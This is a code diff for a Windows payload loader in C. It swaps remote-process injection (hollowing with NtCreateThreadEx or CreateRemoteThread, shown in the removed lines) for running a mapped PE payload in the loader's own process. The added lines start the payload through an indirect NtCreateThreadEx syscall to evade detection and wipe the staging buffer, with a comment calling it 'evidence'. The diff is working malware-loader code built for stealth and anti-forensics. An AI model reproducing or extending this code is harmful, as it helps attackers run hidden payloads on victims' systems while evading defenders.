+    //    and ignored). Prefer indirect NtCreateThreadEx, fall back to CreateThread.
+    PVOID entry=base+pn->OptionalHeader.AddressOfEntryPoint;
     HANDLE th=NULL;
-    ULONG_PTR arg=1;                                    // DLL_PROCESS_ATTACH
-    BOOL spawned=FALSE;
-    LLog("inject: imagebase+size+entry",(DWORD)((ULONG_PTR)base & 0xFFFFFFFF));
-    if(ncte) spawned = ncte(&th,THREAD_ALL_ACCESS,NULL,pi.hProcess,
-                            (PVOID)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
-                            (PVOID)arg,NULL,0x0,0,0,NULL) >= 0;
-    if(spawned) LLog("thread via NtCreateThreadEx",0);
-    if(!spawned && pCreateRemoteThread){
-        th=pCreateRemoteThread(pi.hProcess,NULL,0,
-            (LPTHREAD_START_ROUTINE)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
-            (PVOID)arg,0,&pi.dwThreadId); spawned=(th!=NULL);
-        if(spawned) LLog("thread via CreateRemoteThread",0);
+    if(g_NtThread){
+        LONG st=g_NtThread(&th,THREAD_ALL_ACCESS,NULL,(HANDLE)-1,entry,(PVOID)(ULONG_PTR)1,0,0,0,0,NULL);
+        if(st<0) th=NULL;
+        else LLog("thread: indirect NtCreateThreadEx",0);
     }
-    if(!spawned){ LLog("remote thread create failed",GetLastError()); TerminateProcess(pi.hProcess,0); free(g_payload); return 5; }
+    if(!th){
+        th=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)entry,(PVOID)(ULONG_PTR)1,0,NULL);
+        if(th) LLog("thread: CreateThread fallback",0);
+    }
+    if(!th){ LLog("payload thread create failed",GetLastError()); WipeFree(g_payload); return 5; }
+    WipeFree(g_payload);                    // image is mapped; the staging copy is evidence
 
-    // 10. Payload does its work on the remote thread.
-    //    DO NOT resume the main thread -- the original entry point was unmapped
-    //    by NtUnmapViewOfSection; resuming causes an access violation that kills the
-    //    entire process (and the payload with it). The remote thread runs on its own.
-    WaitForSingleObject(th,wait);
+    // 6. This process IS the payload host. Wait for the payload thread to finish
+    //    (or the -t budget), then exit: there is no remote process to terminate.
+    WaitForSingleObject(th,wait?wait:INFINITE);
     DWORD xc=0; GetExitCodeThread(th,&xc);
-    LLog("remote thread exit code",xc);
-    if(kill) TerminateProcess(pi.hProcess,0);
-    CloseHandle(th); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
-    free(g_payload);
-    LLog("loader OK, payload thread finished",0); return 0;
+    LLog("payload thread exit code",xc);
+    CloseHandle(th);
+    LLog("loader OK, payload thread finished",0);
+    return 0;
 }
